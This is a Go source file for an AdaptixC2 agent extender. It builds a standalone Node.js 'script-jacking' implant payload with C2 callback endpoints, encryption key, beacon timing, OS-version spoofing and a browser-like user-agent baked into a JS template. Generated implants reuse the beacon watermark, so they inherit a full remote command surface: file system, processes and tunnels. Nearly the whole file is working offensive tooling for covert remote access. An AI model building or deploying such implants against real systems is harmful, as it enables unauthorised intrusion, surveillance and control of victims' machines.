// pl_main.go — AdaptixC2 agent extender for the Node.js agent (Loki-style
// script-jacking payload).
//
// This module integrates the Node agent into the framework's payload
// generation: it appears in the GUI "Generate Agent" dialog (agent type
// "node_agent", available for BeaconHTTP listeners) and emits a standalone,
// self-contained JS payload with the listener profile BAKED IN
// (globalThis.__ADAPTIX_BAKED__ prefix) — no sidecar config needed.
//
// Architecture note: the emitted payload keeps agent_type = 0xBE4C0149 (the
// beacon watermark), so registration + tasking are handled by the REAL beacon
// extender module — the full command surface (fs/proc/console, tunnels) is
// the battle-tested one. This module therefore only implements payload
// GENERATION; its CreateAgent/ProcessData paths are stubs that never fire.
package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/Adaptix-Framework/axc2"
)

type Teamserver interface {
	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
	TsAgentBuildLog(builderId string, status int, message string) error
}

type PluginAgent struct{}

type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

// ---------------------------------------------------------------- plugin ----

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	return &PluginAgent{}
}

// dialog fields (serialized by the client from ax_config.axs GenerateUI container)
type GenerateConfig struct {
	AgentId string `json:"agent_id"`
	Sleep   int    `json:"sleep"`
	Jitter  int    `json:"jitter"`
	Debug   bool   `json:"debug"`
	OsSpoof string `json:"os_spoof"`
	Format  string `json:"format"`
	WsUrl   string `json:"ws_url"`
	WsKey   string `json:"ws_key"`
}

// subset of beacon_listener_http TransportConfig (what GetProfile() emits)
type ListenerProfile struct {
	HostBind          string   `json:"host_bind"`
	PortBind          int      `json:"port_bind"`
	CallbackAddresses []string `json:"callback_addresses"`
	EncryptKey        string   `json:"encrypt_key"`
	Ssl               bool     `json:"ssl"`
	HttpMethod        string   `json:"http_method"`
	Uri               []string `json:"uri"`
	ParameterName     string   `json:"hb_header"`
	UserAgent         []string `json:"user_agent"`
	Protocol          string   `json:"protocol"`
}

// per-listener baked profile (JSON, consumed by src/config.js of the payload)
type BakedProfile struct {
	Endpoints    []string  `json:"hosts"`
	Rotation     string    `json:"rotation"`
	Ssl          bool      `json:"ssl"`
	HttpMethod   string    `json:"http_method"`
	Uri          string    `json:"uri"`
	UserAgent    string    `json:"user_agent"`
	HbHeader     string    `json:"hb_header"`
	EncryptKey   string    `json:"encrypt_key"`
	AgentId      any       `json:"agent_id"`
	SessionKey   *string   `json:"session_key"`
	SleepDelay   int       `json:"sleep_delay"`
	JitterDelay  int       `json:"jitter_delay"`
	Debug        bool      `json:"debug"`
	OsSpoof      *osSpoof  `json:"os_spoof"`
	Ws           *wsConfig `json:"ws"`
}

type osSpoof struct {
	Major int `json:"major"`
	Minor int `json:"minor"`
	Build int `json:"build"`
}

type wsConfig struct {
	Url string `json:"url"`
	Key string `json:"key"`
}

func buildLog(builderId string, status int, msg string) {
	if builderId == "" {
		return // sync build path has no log channel
	}
	_ = Ts.TsAgentBuildLog(builderId, status, msg)
}

func randHex32() string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

var osSpoofMap = map[string]osSpoof{
	"win7":    {6, 1, 7601},
	"win10":   {10, 0, 19045},
	"win11":   {10, 0, 22631},
	"win2022": {10, 0, 20348},
}

// ---------------------------------------------------------- profiles --------

func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var agentProfiles [][]byte

	for _, transportProfile := range profile.ListenerProfiles {
		var listenerMap ListenerProfile
		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
			return nil, fmt.Errorf("listener profile parse: %w", err)
		}

		if listenerMap.Protocol != "" && listenerMap.Protocol != "http" {
			return nil, errors.New("node_agent supports only the BeaconHTTP listener (protocol http)")
		}
		if listenerMap.EncryptKey == "" {
			return nil, errors.New("listener profile has no encrypt_key")
		}

		// callback addresses win; fall back to the bind address
		endpoints := make([]string, 0, len(listenerMap.CallbackAddresses))
		for _, line := range listenerMap.CallbackAddresses {
			line = strings.TrimSpace(line)
			if line != "" {
				endpoints = append(endpoints, line)
			}
		}
		if len(endpoints) == 0 {
			endpoints = append(endpoints, fmt.Sprintf("%s:%d", listenerMap.HostBind, listenerMap.PortBind))
		}

		uri := "/content.html"
		if len(listenerMap.Uri) > 0 && strings.TrimSpace(listenerMap.Uri[0]) != "" {
			uri = strings.TrimSpace(listenerMap.Uri[0])
		}
		ua := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
		if len(listenerMap.UserAgent) > 0 && strings.TrimSpace(listenerMap.UserAgent[0]) != "" {
			ua = strings.TrimSpace(listenerMap.UserAgent[0])
		}
		hb := "X-Beacon-Id"
		if listenerMap.ParameterName != "" {
			hb = listenerMap.ParameterName
		}
		method := listenerMap.HttpMethod
		if method == "" {
			method = "POST"
		}

		baked := BakedProfile{
			Endpoints:   endpoints,
			Rotation:    "sequential",
			Ssl:         listenerMap.Ssl,
			HttpMethod:  method,
			Uri:         uri,
			UserAgent:   ua,
			HbHeader:    hb,
			EncryptKey:  listenerMap.EncryptKey,
			AgentId:     "auto",
			SessionKey:  nil,
			SleepDelay:  5,
			JitterDelay: 15,
			Debug:       false,
			OsSpoof:     nil,
			Ws:          nil,
		}

		out, err := json.Marshal(baked)
		if err != nil {
			return nil, err
		}
		agentProfiles = append(agentProfiles, out)
	}
	return agentProfiles, nil
}

// ----------------------------------------------------------- payload --------

func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	if len(profile.ListenerProfiles) != 1 || len(agentProfiles) != 1 {
		return nil, "", errors.New("node_agent: exactly one listener profile is supported")
	}

	var cfg GenerateConfig
	if err := json.Unmarshal([]byte(profile.AgentConfig), &cfg); err != nil {
		return nil, "", fmt.Errorf("agent config parse: %w", err)
	}

	var baked BakedProfile
	if err := json.Unmarshal(agentProfiles[0], &baked); err != nil {
		return nil, "", fmt.Errorf("baked profile parse: %w", err)
	}

	// --- dialog overrides --------------------------------------------------
	if cfg.AgentId != "" && cfg.AgentId != "auto" {
		id, err := strconv.ParseUint(strings.TrimPrefix(cfg.AgentId, "0x"), 16, 32)
		if err != nil {
			return nil, "", errors.New("agent_id must be hex (e.g. cafe0011) or 'auto'")
		}
		baked.AgentId = uint32(id)
		// a FIXED id must keep ONE session key across relaunches — bake a
		// random one at build time so no sidecar file is needed on target
		key := randHex32()
		baked.SessionKey = &key
	}
	if cfg.Sleep > 0 {
		baked.SleepDelay = cfg.Sleep
	}
	if cfg.Jitter > 0 {
		baked.JitterDelay = cfg.Jitter
	}
	baked.Debug = cfg.Debug

	if cfg.OsSpoof != "" && cfg.OsSpoof != "none" {
		if v, ok := osSpoofMap[strings.ToLower(cfg.OsSpoof)]; ok {
			baked.OsSpoof = &v
		} else {
			return nil, "", errors.New("os_spoof must be one of: none, win7, win10, win11, win2022")
		}
	}

	if cfg.WsUrl != "" || cfg.WsKey != "" {
		if cfg.WsUrl == "" || len(cfg.WsKey) != 32 {
			return nil, "", errors.New("interactive channel: ws_key must be exactly 32 hex chars and ws_url must be set")
		}
		baked.Ws = &wsConfig{Url: cfg.WsUrl, Key: cfg.WsKey}
	}

	// --- assemble the payload ----------------------------------------------
	bakedJson, err := json.Marshal(baked)
	if err != nil {
		return nil, "", err
	}

	template, err := os.ReadFile(ModuleDir + "/payload.node.js")
	if err != nil {
		return nil, "", fmt.Errorf("payload template missing (payload.node.js next to the .so): %w", err)
	}

	buildLog(profile.BuilderId, 1, fmt.Sprintf("node_agent: endpoints=%v ssl=%v sleep=%ds agent_id=%v", baked.Endpoints, baked.Ssl, baked.SleepDelay, baked.AgentId))

	payload := append([]byte("globalThis.__ADAPTIX_BAKED__ = "), bakedJson...)
	payload = append(payload, []byte(";\n")...)
	payload = append(payload, template...)

	return payload, "adaptix.payload.js", nil
}

// ------------------------------------------------------------- stubs --------

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

// Unreachable: generated payloads carry the BEACON watermark, so the real
// beacon module registers and task-commands them (full command surface).
func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	return adaptix.AgentData{}, nil, errors.New("node_agent: registration is handled by the beacon module")
}

func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
	return nil, errors.New("not implemented")
}
func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
	return nil, errors.New("not implemented")
}
func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	return nil, errors.New("not implemented")
}
func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	return adaptix.TaskData{}, errors.New("not implemented")
}
func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, errors.New("not implemented")
}
func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	return errors.New("not implemented")
}
func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{}
}
func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{}
}
